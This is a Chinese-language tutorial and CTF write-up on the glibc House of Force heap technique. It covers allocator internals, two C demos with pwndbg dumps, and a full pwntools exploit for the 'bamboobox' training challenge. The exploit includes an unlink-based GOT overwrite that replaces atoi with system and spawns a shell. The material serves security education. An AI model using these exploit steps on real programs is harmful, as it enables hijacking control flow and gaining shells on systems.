# House Of Force

## 原理

如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：

1. 可以控制到 top chunk的szie域
2. 可以控制堆分配尺寸的大小

进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间

当使用 top chunk 分配堆块的size值可以被修改为任意值时，就可以是的 top chunk 指向期待的任何位置，相当于一次任意地址写。glibc 中对用户请求的大小和 top chunk 现有的 size 进行验证：

```c++
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

如果可以修改size域为一个很大的值，就可以绕过这个验证：

> (unsigned long) (size) >= (unsigned long) (nb + MINSIZE)

一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证

```c++
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```

之后更新top chunk指针，同时需要注意的是 top chunk 的 size 域也会更新：

```c++
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE

## 示例1

减小 top chunk指针修改位于其上面（低地址）的内容

```c++
// 通过 house of force 篡改 malloc@got
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

分配一个 0x10 大小的块：

```s
pwndbg> x/8g 0x602000
0x602000:   0x0000000000000000  0x0000000000000021 <-- ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 <-- top chunk
0x602030:   0x0000000000000000  0x0000000000000000
```

之后修改 top chunk 的size域为-1：

```s
pwndbg> x/8g 0x602000
0x602000:   0x0000000000000000  0x0000000000000021 <-- ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0xffffffffffffffff <-- top chunk
0x602030:   0x0000000000000000  0x0000000000000000
```

此时 top_chunk的位置：

```s
pwndbg> x/16g &main_arena
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x0000000000602020 <-- top chunk
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```

接下来执行 `malloc(-4120)`
程序中`malloc@got`的位置：

```s
pwndbg> x/x 0x601020
0x601020:   0x00007ffff7a91130
pwndbg> x/s 0x00007ffff7a91130
0x7ffff7a91130 <__GI___libc_malloc>:    "USH\203\354\bH\213\005\263\375\063"
pwndbg>
```

所以我们需要将 top chunk 指向 0x601010 处，以便在下一次请求分配的时候分配得到指向 `malloc@got`的内存。所以计算偏移如下：

`0x601010-0x602020=-4112`

此外，用户申请的内存大小一旦进入申请内存的函数就变成无符号整数

```c++
void *__libc_malloc(size_t bytes)
```

如果想要用户输入的大小经过内部的 checked_request2size可以得到这样的大小:

```c++
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

1. 需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的
2. 在满足对应的约束后，需要使得 request2size正好转换为对应的大小，也就是说，((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK 恰好为 - 4112,-4112 是 chunk 对齐的，只需要将其分别减去 SIZE_SZ（4 in 32bit,8 in 64bit)，不满足 MALLOC_ALIGN时就需要减去一个比 4112 大的值

之后，调用`malloc(-4120), top chunk 就会被抬高到相应的位置：

```s
pwndbg> x/4x 0x7ffff7dd1b70
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x0000000000601010
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
pwndbg>
```

之后分配的堆块就在 0x601010+0x10，需要注意的是 top chunk被抬高的同时，`malloc@got`附近的内容也会被修改：

```c++
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
```

## 示例2

增大 top chunk 指针，修改位于其下面（高地址）的内容

```c++
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 //<=== 修改top chunk size
    malloc(140737345551056); //<=== 增大top chunk指针
    malloc(0x10); // <=== 分配堆块实现任意写
}
```

与示例1基本相同，唯一不同点即是增大top chunk指针的malloc申请的大小不同，尝试修改 `malloc_hook`, `malloc_hook`位于 libc.so的全局变量
查看内存布局：

```s
nop@nop-pwn:~$ cat /proc/6736/maps
00400000-00401000 r-xp 00000000 08:01 1570115                            /home/nop/Desktop/hof
00600000-00601000 r--p 00000000 08:01 1570115                            /home/nop/Desktop/hof
00601000-00602000 rw-p 00001000 08:01 1570115                            /home/nop/Desktop/hof
00602000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1313692                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1313692                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1313692                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1313692                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1313664                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fd7000-7ffff7fda000 rw-p 00000000 00:00 0
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1313664                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1313664                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

```

heap 的基址在 0x00602000，libc的基址在 0x7ffff7a0d000

通过增大 top chunk 指针的值来实现对`malloc_hook`的写：

1. `malloc_hook`的地址: 0x7ffff7dd1b10

   ```s
    pwndbg> x/x &main_arena
    0x7ffff7dd1b20 <main_arena>:    0x0000000100000000
    pwndbg> x/8g 0x7ffff7dd1b20 - 0x30
    0x7ffff7dd1af0 <_IO_wide_data_0+304>:   0x00007ffff7dd0260  0x0000000000000000
    0x7ffff7dd1b00 <__memalign_hook>:   0x00007ffff7a92e20  0x00007ffff7a92a00
    0x7ffff7dd1b10 <__malloc_hook>: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000
    ```

2. 计算偏移： `0x7ffff7dd1b00 - 0x00602000 - 0x10 = 140737345551056`
3. `malloc(140737345551056)`之后：

   ```s
    pwndbg> x/4g 0x7ffff7dd1b70
    0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x00007ffff7dd1b00 <-- top chunk
    0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
    pwndbg>
    ```

4. 之后再申请：分配得到 0x7ffff7dd1b10 处的 `malloc_hook` 值

## House Of Force的利用条件

1. 存在漏洞可以控制 top chunk 的size 域
2. 可以自由控制 malloc 的分配大小
3. 分配次数不受限制

## 实例-HITCON training bamboobox

### 基本功能-bamboobox

程序开始时即申请了 0x10 的内存，用来保留两个函数指针

1. show: 展示盒子里的内容
2. add: 向盒子里添加物品，根据用户输入的大小来为每一个物品申请对应的内存，作为其存储名字的空间
3. 修改物品的名字，根据给定的索引，以及大小，向指定索引的物品中读取指定长度名字，存在堆溢出漏洞
4. 删除物品，将对应物品的名字的大小置为 0，并将对应的 content 置为 NULL

存在一个 magic 函数可以读取flag

### 利用-bamboobox

#### House of Force

程序开始时申请了一块内存用来存放两个函数指针，hello_message 用于程序开始时使用，goodbye_message 用于在程序结束时使用，所以可以利用覆盖 goodbye_message 来控制程序执行流:

1. 添加物品，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值
2. 利用 house of force 技巧，分配 chunk 至堆的基地址
3. 覆盖 goodbye_message 为 magic 函数地址来控制程序执行流

#### unlink

1. 利用unlink将第一个堆块即 id0 改到 0x006020b0
2. 覆写itemlist为 aoti@got
3. 利用show泄露aoti地址，得到libc基址
4. 覆写 aoti@got 为 system 的地址

因为程序在获取用户选择时使用了 aoti，所以改写 aoti之后，实际上就会执行 `system(option)`

#### EXPLOIT-bamboobox

```python
from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux',arch='amd64')
context.log_level='DEBUG'

# there are two ways to get flag
# one for hof,this way colud read flag and print it
# one for unlink,this way could get shell

p = process('./bamboobox')

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def show():
    ru("Your choice:")
    s(1)
    ru(' : ')
    return r(6)

def add(len,name):
    ru("Your choice:")
    s(2)
    ru("Please enter the length of item name:")
    s(len)
    ru("Please enter the name of item:")
    s(name)

def chage(index,name):
    ru("Your choice:")
    s(3)
    ru("Please enter the index of item:")
    s(index)
    ru("Please enter the length of item name:")
    s(len(name))
    ru("Please enter the new name of the item:")
    s(name)

def remove(index):
    ru("Your choice:")
    s(4)
    ru("Please enter the index of item:")
    s(index)

def dbg():
    gdb.attach(p)
    pause()

def hof():
    add(0x30,'aaa') #id0
    # dbg()
    # pwndbg> x/16g 0x10d0020
    # 0x10d0020:    0x0000000000000000  0x0000000000000041 <- id0
    # 0x10d0030:    0x0000000000616161  0x0000000000000000
    # 0x10d0040:    0x0000000000000000  0x0000000000000000
    # 0x10d0050:    0x0000000000000000  0x0000000000000000
    # 0x10d0060:    0x0000000000000000  0x0000000000020fa1 <- top chunk
    # 0x10d0070:    0x0000000000000000  0x0000000000000000


    offset = 0x10d0000 - 0x10d0060
    malloc_size = offset - 0x8 # SIZE_SZ = 0x8(at 64 bit)
    payload = 'a'*0x30 + 'a'*8 + p64(0xffffffffffffffff)
    chage(0,payload)
    # dbg()
    # pwndbg> x/16g 0x237b020
    # 0x237b020:    0x0000000000000000  0x0000000000000041
    # 0x237b030:    0x6161616161616161  0x6161616161616161
    # 0x237b040:    0x6161616161616161  0x6161616161616161
    # 0x237b050:    0x6161616161616161  0x6161616161616161
    # 0x237b060:    0x6161616161616161  0xffffffffffffffff <- top chunk
    # 0x237b070:    0x0000000000000000  0x0000000000000000

    add(malloc_size,'bbb')
    # dbg()
    # pwndbg> x/16g &main_arena
    # 0x7fcde41dbb20 <main_arena>:  0x0000000100000000  0x0000000000000000
    # 0x7fcde41dbb30 <main_arena+16>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb40 <main_arena+32>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb50 <main_arena+48>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb60 <main_arena+64>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb70 <main_arena+80>:   0x0000000000000000  0x0000000001e9f000 < top chunk
    # 0x7fcde41dbb80 <main_arena+96>:   0x0000000000000000  0x00007fcde41dbb78
    # 0x7fcde41dbb90 <main_arena+112>:  0x00007fcde41dbb78  0x00007fcde41dbb88
    # pwndbg> x/16g 0x0000000001e9f000
    # 0x1e9f000:    0x0000000000000000  0x0000000000000059
    # 0x1e9f010:    0x0000000000400896  0x00000000004008b1
    # 0x1e9f020:    0x0000000000000000  0x0000000000000041 <- id0
    # 0x1e9f030:    0x6161616161616161  0x6161616161616161
    # 0x1e9f040:    0x6161616161616161  0x6161616161616161
    # 0x1e9f050:    0x6161616161616161  0x6161616161616161
    # 0x1e9f060:    0x6161616161616161  0x00ffffffffffffa1
    # 0x1e9f070:    0x0000000000000000  0x0000000000000000

    add(0x10,p64(0x400D49)*2)
    # dbg()
    # pwndbg> x/8g 0x1523000
    # 0x1523000:    0x0000000000000000  0x0000000000000021
    # 0x1523010:    0x0000000000400d49  0x0000000000400d49 <- magic
    # 0x1523020:    0x0000000000000000  0x0000000000000039
    # 0x1523030:    0x6161616161616161  0x6161616161616161

    print ru("Your choice:")
    s(5)
    print r()

def unlinnk():
    elf = ELF('./bamboobox',checksec=False)
    atoi_got = elf.got['atoi']
    add(0x40,'aaa') #id0
    add(0x80,'bbb') #id1
    add(0x10,'ccc') #id2, in orderto aovid id1 combine with top chunk when we free it
    target = 0x006020C8 # box
    fake_chunk = p64(0) + p64(0x41)
    fake_chunk += p64(target - 0x18) + p64(target - 0x10)
    fake_chunk += p64(0)*4
    fake_chunk += p64(0x40) + p64(0x90)
    chage(0,fake_chunk)
    # dbg()
    # pwndbg> x/16g 0xe1f020
    # 0xe1f020: 0x0000000000000000  0x0000000000000051
    # 0xe1f030: 0x0000000000000000  0x0000000000000041
    # 0xe1f040: 0x00000000006020b0  0x00000000006020b8
    # 0xe1f050: 0x0000000000000000  0x0000000000000000
    # 0xe1f060: 0x0000000000000000  0x0000000000000000
    # 0xe1f070: 0x0000000000000040  0x0000000000000090 <- id1
    # 0xe1f080: 0x0000000000626200  0x0000000000000000
    # 0xe1f090: 0x0000000000000000  0x0000000000000000
    remove(1)
    # dbg()
    # pwndbg> x/16g 0x161d020
    # 0x161d020:    0x0000000000000000  0x0000000000000051
    # 0x161d030:    0x0000000000000000  0x00000000000000d1
    # 0x161d040:    0x00007f8f5abacb78  0x00007f8f5abacb78
    # 0x161d050:    0x0000000000000000  0x0000000000000000
    # 0x161d060:    0x0000000000000000  0x0000000000000000
    # 0x161d070:    0x0000000000000040  0x0000000000000090
    # 0x161d080:    0x0000000000626200  0x0000000000000000
    # 0x161d090:    0x0000000000000000  0x0000000000000000
    # now id0 point to fake_chunk's fd(0x006020b0) which at .bss
    # we jsut need to padding to 0x00000000006020C0(itemlist) and rewite it to atoi@got
    # and then leak the libc
    # dbg()
    payload = p64(0)*2 + p64(0x40) + p64(atoi_got)
    chage(0,payload)
    atoi_addr = u64(show().ljust(8,'\x00'))
    leak('atoi',atoi_addr)
    libc = LibcSearcher('atoi',atoi_addr)
    libc_base = atoi_addr - libc.dump('atoi')
    system_addr = libc_base + libc.dump('system')
    leak('system',system_addr)
    # dbg()
    # pwndbg> x/16g 0x006020b0
    # 0x6020b0 <stdin@@GLIBC_2.2.5>:    0x0000000000000000  0x0000000000000000
    # 0x6020c0 <itemlist>:  0x0000000000000040  0x0000000000602068
    # 0x6020d0 <itemlist+16>:   0x0000000000000000  0x0000000000000000
    # 0x6020e0 <itemlist+32>:   0x0000000000000010  0x0000000001050110
    # 0x6020f0 <itemlist+48>:   0x0000000000000000  0x0000000000000000
    # 0x602100 <itemlist+64>:   0x0000000000000000  0x0000000000000000
    # 0x602110 <itemlist+80>:   0x0000000000000000  0x0000000000000000
    # 0x602120 <itemlist+96>:   0x0000000000000000  0x0000000000000000

    chage(0,p64(system_addr))
    # dbg()
    # pwndbg> x/16g 0x0000000000602068
    # 0x602068: 0x00007f66cc821390  0x0000000000400700 <- aoti@got was chaged to system@got
    # 0x602078: 0x0000000000000000  0x0000000000000000
    # 0x602088: 0x0000000000000000  0x0000000000000000

    ru("Your choice:")
    sl('sh')
    # dbg()
    itr()

if __name__ == '__main__':
    unlinnk()
    # hof()
```
